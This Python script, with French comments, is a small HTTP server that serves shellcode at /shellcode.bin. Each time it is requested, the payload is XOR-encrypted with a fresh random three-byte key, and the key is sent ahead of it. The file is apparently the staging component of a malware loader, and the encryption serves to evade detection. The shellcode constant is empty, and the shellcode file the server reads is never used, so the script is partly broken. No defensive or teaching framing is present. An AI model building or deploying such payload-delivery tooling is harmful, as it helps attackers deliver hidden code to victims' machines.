import os
import random
from http.server import SimpleHTTPRequestHandler, HTTPServer
from itertools import cycle


SHELLCODE = b""


# Fonction pour générer une clé aléatoire de 3 caractères
def generate_key(length=3):
    return os.urandom(length)


# Fonction pour chiffrer le shellcode en utilisant XOR
def encrypt_payload(payload, key):
    return bytearray(a ^ b for a, b in zip(payload, cycle(key)))


class ShellcodeServer(SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/shellcode.bin":
            try:
                with open("shellcode.bin", "rb") as f:
                    shellcode = f.read()

                key = generate_key()

                encrypted_payload = encrypt_payload(SHELLCODE, key)
                payload_tosend = key + encrypted_payload

                # payload_tosend = SHELLCODE

                self.send_response(200)
                self.send_header("Content-type", "application/octet-stream")
                self.send_header("Content-length", str(len(payload_tosend)))
                self.end_headers()
                self.wfile.write(payload_tosend)

            except FileNotFoundError:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"Shellcode file not found.")
        else:
            self.send_response(404)
            self.end_headers()


if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", 8000), ShellcodeServer)
    print("Server started at http://127.0.0.1:8000/shellcode.bin")
    server.serve_forever()
